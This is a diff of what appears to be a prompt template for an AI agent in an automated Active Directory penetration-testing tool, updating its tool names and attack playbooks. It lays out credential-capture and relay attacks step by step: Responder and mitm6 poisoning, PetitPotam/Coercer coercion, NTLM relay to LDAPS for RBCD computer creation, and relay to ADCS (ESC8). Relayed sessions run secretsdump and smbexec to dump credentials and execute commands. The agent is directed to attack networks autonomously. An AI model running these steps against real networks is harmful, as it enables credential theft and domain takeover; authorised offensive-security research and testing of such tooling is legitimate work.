@@ -28,9 +28,9 @@ Your role is to capture authentication traffic and coerce systems to authenticat
 ### Responder
 Primary tool for capturing hashes:
 ```
-responder(
+start_responder(
     interface=""  # Auto-detected (e.g., ens5 on AWS),
-    analyze=False  # Set True for passive mode
+    analyze_mode=False  # Set True for passive mode
 )
 ```
 
@@ -42,9 +42,9 @@ Captures:
 ### mitm6
 IPv6-based attacks:
 ```
-mitm6(
-    interface=""  # Auto-detected (e.g., ens5 on AWS),
-    domain="corp.local"
+start_mitm6(
+    domain="corp.local",
+    interface=""  # Auto-detected (e.g., ens5 on AWS)
 )
 ```
 
@@ -110,29 +110,21 @@ Coordinate with PrivEsc agent:
 3. Relay performs LDAP actions
 ```
 
-### SOCKS Relay (Interactive Sessions)
-Capture and reuse SMB sessions for multiple tools:
+### Multi-Target Relay
+Relay to multiple SMB targets from a targets file:
 ```
-1. ntlmrelayx_socks(targets="relay.txt")
-   → Start relay with SOCKS proxy (port 1080)
-2. Run coercion or wait for LLMNR/NBT-NS captures
-3. Check active sessions with ntlmrelayx console
-4. Use sessions via proxychains:
-   - proxychains secretsdump -no-pass DOMAIN/USER@TARGET
-   - proxychains smbexec -no-pass DOMAIN/USER@TARGET
-   → Execute tools through relayed sessions
+1. ntlmrelayx_multirelay(targets_file="/tmp/relay_targets.txt")
+   → Start relay listening for incoming auth
+2. Run coercion (petitpotam/coercer) or wait for LLMNR/NBT-NS captures
+3. Relay executes secretsdump on successful relay
 ```
 
 ### DHCPv6 + LDAP Relay (Create Computer for RBCD)
 Combine mitm6 with ntlmrelayx to create computer account:
 ```
-1. mitm6(interface=""  # Auto-detected (e.g., ens5 on AWS), domain="domain.com")
+1. start_mitm6(domain="domain.com", interface="")
    → Poison DHCPv6 responses
-2. ntlmrelayx_ldap(
-       target="ldaps://dc.domain.com",
-       add_computer="YOURPC",
-       delegate_access=True
-   )
+2. ntlmrelayx_to_ldaps(dc_ip="192.168.58.10", delegate_access=True)
    → Relay to LDAPS, create computer with RBCD rights
 3. Wait for machine authentication (WPAD requests)
 4. Use created computer for RBCD attack:
@@ -167,27 +159,25 @@ Combine mitm6 with ntlmrelayx to create computer account:
 - {{ tool }}
 {% endfor -%}
 
-### Coercion (Responder/mitm6) Tools
+### Poisoning Tools
 | Tool | Use Case |
 |------|----------|
-| responder | LLMNR/NBT-NS/mDNS spoofing |
-| mitm6 | IPv6 DNS takeover |
+| start_responder | LLMNR/NBT-NS/mDNS spoofing |
+| start_mitm6 | IPv6 DNS takeover |
 
 ### Coercion Tools
 | Tool | Use Case |
 |------|----------|
-| petitpotam | MS-EFSR coercion |
-| coercer | Multi-protocol coercion |
-| printerbug | MS-RPRN coercion |
-| dfscoerce | MS-DFSNM coercion |
+| petitpotam | MS-EFSR coercion (PetitPotam) |
+| coercer | Multi-protocol coercion (tries MS-EFSR, MS-RPRN, MS-DFSNM, etc.) |
 
 ### Relay Tools
 | Tool | Use Case |
 |------|----------|
-| ntlmrelayx | Multi-target relay |
-| ntlmrelayx_socks | Relay with SOCKS proxy for session reuse |
-| ntlmrelayx_ldap | Relay to LDAP/LDAPS (add computer, delegate) |
-| krbrelayx | Kerberos relay |
+| ntlmrelayx_to_smb | Relay to SMB for psexec/secretsdump |
+| ntlmrelayx_to_ldaps | Relay to LDAPS (RBCD, delegate-access) |
+| ntlmrelayx_to_adcs | Relay to ADCS web enrollment (ESC8) |
+| ntlmrelayx_multirelay | Multi-target relay with targets file |
 
 ## Hash Types Captured
 
